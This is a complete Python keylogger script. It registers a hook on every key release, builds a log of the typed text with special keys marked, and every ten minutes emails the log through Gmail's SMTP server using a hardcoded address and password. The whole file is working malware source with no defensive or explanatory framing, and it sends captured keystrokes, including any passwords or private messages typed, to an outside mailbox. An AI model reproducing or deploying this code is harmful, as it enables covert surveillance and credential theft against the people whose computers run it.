import keyboard
import smtplib
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 600
EMAIL_ADDRESS = "Blackhat_test@protonmail.ch"
EMAIL_PASSWORD = "test@123"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
        
    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # excluding character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                # whenever  ENTER is pressed, add a new line
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        
    def sendmail(self, email, password, message):
        # connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # enter credentials to email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
